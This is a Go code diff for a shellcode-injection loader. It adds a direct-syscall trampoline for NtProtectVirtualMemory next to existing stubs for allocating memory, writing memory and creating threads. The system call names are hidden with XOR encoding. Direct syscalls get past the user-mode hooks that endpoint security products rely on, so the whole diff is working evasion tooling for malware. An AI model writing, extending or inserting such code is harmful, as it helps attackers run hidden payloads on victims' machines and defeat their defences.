@@ -14,6 +14,7 @@ type SyscallStub struct {
 	ntdllHandle     uintptr
 	sysAllocMem     uintptr // NtAllocateVirtualMemory
 	sysWriteMem     uintptr // NtWriteVirtualMemory
+	sysProtectMem   uintptr // NtProtectVirtualMemory
 	sysCreateThread uintptr // NtCreateThreadEx
 }
 
@@ -38,12 +39,16 @@ func (s *SyscallStub) Init() error {
 	if err != nil {
 		return err
 	}
+	ssnProtect, err := s.getSSN(xorDecrypt([]byte{0x39, 0x03, 0x27, 0x05, 0x18, 0x03, 0x12, 0x14, 0x03, 0x21, 0x1e, 0x05, 0x03, 0x02, 0x16, 0x1b, 0x3a, 0x12, 0x1a, 0x18, 0x05, 0x0e}))
+	if err != nil {
+		return err
+	}
 	ssnCreate, err := s.getSSN(xorDecrypt([]byte{0x39, 0x03, 0x34, 0x05, 0x12, 0x16, 0x03, 0x12, 0x23, 0x1f, 0x05, 0x12, 0x16, 0x13, 0x32, 0x0f}))
 	if err != nil {
 		return err
 	}
 
-	fmt.Printf("[+] SSN Resolved: Alloc=0x%x, Write=0x%x, Create=0x%x\n", ssnAlloc, ssnWrite, ssnCreate)
+	fmt.Printf("[+] SSN Resolved: Alloc=0x%x, Write=0x%x, Protect=0x%x, Create=0x%x\n", ssnAlloc, ssnWrite, ssnProtect, ssnCreate)
 
 	// 2. 为每个 SSN 创建 Trampoline
 	s.sysAllocMem, err = s.createStub(ssnAlloc)
@@ -52,6 +57,11 @@ func (s *SyscallStub) Init() error {
 	}
 
 	s.sysWriteMem, err = s.createStub(ssnWrite)
+	if err != nil {
+		return err
+	}
+
+	s.sysProtectMem, err = s.createStub(ssnProtect)
 	if err != nil {
 		return err
 	}
@@ -161,6 +171,19 @@ func (s *SyscallStub) NtWriteVirtualMemory(processHandle uintptr, baseAddr uintp
 		buffer,
 		size,
 		uintptr(unsafe.Pointer(bytesWritten)),
+		0,
+	)
+	return r1
+}
+
+func (s *SyscallStub) NtProtectVirtualMemory(processHandle uintptr, baseAddr *uintptr, numberOfBytesToProtect *uintptr, newAccessProtection uintptr, oldAccessProtection *uintptr) uintptr {
+	// NtProtectVirtualMemory(ProcessHandle, *BaseAddress, *NumberOfBytesToProtect, NewAccessProtection, *OldAccessProtection)
+	r1, _, _ := syscall.Syscall6(s.sysProtectMem, 5,
+		processHandle,
+		uintptr(unsafe.Pointer(baseAddr)),
+		uintptr(unsafe.Pointer(numberOfBytesToProtect)),
+		newAccessProtection,
+		uintptr(unsafe.Pointer(oldAccessProtection)),
 		0,
 	)
 	return r1
